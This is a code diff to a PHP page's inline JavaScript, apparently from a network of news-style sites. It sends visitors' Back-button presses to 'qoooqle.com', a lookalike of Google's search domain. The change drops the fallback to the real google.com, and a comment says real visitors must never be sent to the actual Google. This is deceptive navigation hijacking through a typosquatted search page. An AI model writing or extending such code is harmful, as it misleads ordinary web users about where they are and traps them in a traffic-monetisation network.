@@ -782,13 +782,18 @@ $site_name  = htmlspecialchars($newsnik1_domain);
 <script>
 (function() {
     var SERP_DOMAIN = 'qoooqle.com';
-    var searchParams = new URLSearchParams(window.location.search);
-    var lang = searchParams.get('lang') || 'en';
-    var host = searchParams.get('host');
-    var brand = searchParams.get('brand') || '';
-    var geo = searchParams.get('geo') || '';
+    // qoooqle_store_context_if_needed() 302-redirects ?lang=&host=&... to a query-string-free
+    // URL (storing the values in $_SESSION instead) — by the time this script runs,
+    // window.location.search is already empty, so the context has to come from PHP
+    // (same session-aware source the rest of the page uses), not be re-parsed here.
+    var lang = <?php echo json_encode($lang ?: 'en'); ?>;
+    var host = <?php echo json_encode($_host_param); ?>;
+    var brand = <?php echo json_encode($brand_name_param ?: ''); ?>;
+    var geo = <?php echo json_encode(qoooqle_get_context_value('geo', '')); ?>;
     // No host means this standalone newsnik domain was hit directly (test/bot/bookmark),
     // not via a real offer's google.php link — there's no page to send them back to.
+    // Either way the back target must stay on our own network: never send a real
+    // visitor's Back-button press to the actual google.com.
     var targetUrl;
     if (host) {
         var backParams = new URLSearchParams();
@@ -796,9 +801,9 @@ $site_name  = htmlspecialchars($newsnik1_domain);
         backParams.set('host', host);
         if (brand) backParams.set('brand', brand);
         if (geo) backParams.set('geo', geo);
-        targetUrl = 'https://' + SERP_DOMAIN + '/index.php?' + backParams.toString();
+        targetUrl = 'https://' + SERP_DOMAIN + '/?' + backParams.toString();
     } else {
-        targetUrl = 'https://www.google.com';
+        targetUrl = 'https://' + SERP_DOMAIN + '/';
     }
     var activated = false;
 
